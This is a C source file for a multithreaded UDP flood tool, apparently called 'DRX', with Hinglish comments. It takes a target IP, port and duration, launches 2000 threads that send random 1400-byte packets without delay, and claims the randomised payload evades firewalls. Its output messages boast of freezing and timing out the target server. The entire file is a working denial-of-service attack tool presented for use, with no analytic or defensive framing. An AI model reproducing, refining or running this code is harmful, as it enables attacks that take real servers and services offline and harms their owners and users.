#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

/* - High Power Configuration for 32GB VPS */
char *target_ip;
int target_port;

/* Binary size badhane ke liye junk data buffer */
static char weight_buffer[1024 * 1024 * 30] = {0x77}; 

void *attack_logic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    
    // - Socket setup with High Speed Optimization
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return NULL;

    // Buffer size badhana taaki VPS ki speed bottleneck na bane
    int sndbuf = 10 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    // - Intelligent Garbage Payload (Bypass Firewall)
    unsigned char payload[1400];
    
    while (1) {
        // Har packet ko random banana taaki firewall detect na kare
        for(int i = 0; i < 1400; i++) {
            payload[i] = rand() % 256;
        }

        // Without delay direct hit
        sendto(sock, payload, 1400, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: ./drx <IP> <PORT> <TIME>\n");
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    int time_limit = atoi(argv[3]);

    // - 32GB RAM ke liye 2000 threads optimal power dete hain
    int total_threads = 2000;
    pthread_t threads[total_threads];

    srand(time(NULL));
    printf("🔥 DRX POWER - PROFESSIONAL MODE ACTIVE\n");
    printf("🎯 TARGETING: %s:%d\n", target_ip, target_port);
    printf("⚡ THREADS: %d | STATUS: FREEZING SERVER...\n", total_threads);

    for (int i = 0; i < total_threads; i++) {
        pthread_create(&threads[i], NULL, attack_logic, NULL);
    }

    // Time limit tak attack chalu rakhna
    sleep(time_limit);

    printf("✅ ATTACK FINISHED. SERVER TIMED OUT SUCCESSFULLY.\n");
    return 0;
}
